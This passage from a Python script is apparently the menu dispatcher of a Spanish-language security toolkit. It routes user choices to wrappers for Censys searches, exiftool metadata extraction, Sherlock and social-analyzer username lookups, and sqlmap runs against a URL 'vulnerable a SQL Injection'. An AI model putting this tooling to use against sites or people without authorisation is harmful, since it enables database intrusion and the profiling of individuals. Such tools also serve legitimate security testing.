            output = input("Archivo de salida [por defecto: social_analyzer_result.json]: ").strip() or "social_analyzer_result.json"
            escaneo_social_analyzer(usuario, output)
        elif opcion == "53":
            query = input("Consulta de búsqueda para Censys (ejemplo: 443.http.get.headers.server: Apache): ").strip()
            output = input("Archivo de salida [por defecto: censys_result.txt]: ").strip() or "censys_result.txt"
            escaneo_censys(query, output)
        elif opcion == "54":
            archivo = input("Ruta al archivo para extraer metadatos (imagen, PDF, DOC, etc.): ").strip()
            output = input("Archivo de salida [por defecto: exiftool_result.txt]: ").strip() or "exiftool_result.txt"
            if not os.path.isfile(archivo):
                print(f"Error: El archivo '{archivo}' no existe. Verifica la ruta.")
            else:
                escaneo_exiftool(archivo, output)
        elif opcion == "55":
            url = input("URL objetivo vulnerable a SQL Injection (ejemplo: http://example.com/page?id=1): ").strip()
            output = input("Archivo de salida [por defecto: sqlmap_result.txt]: ").strip() or "sqlmap_result.txt"
            extra = input("Parámetros extra para sqlmap (deja vacío si no): ").strip()
            escaneo_sqlmap(url, output, extra)
        elif opcion == "56":
            usuario = input("Nombre de usuario para buscar en redes sociales con Sherlock: ").strip()
            output = input("Archivo de salida [por defecto: sherlock_result.txt]: ").strip() or "sherlock_result.txt"
            escaneo_sherlock(usuario, output)
        else:
            print("Opción no válida.")
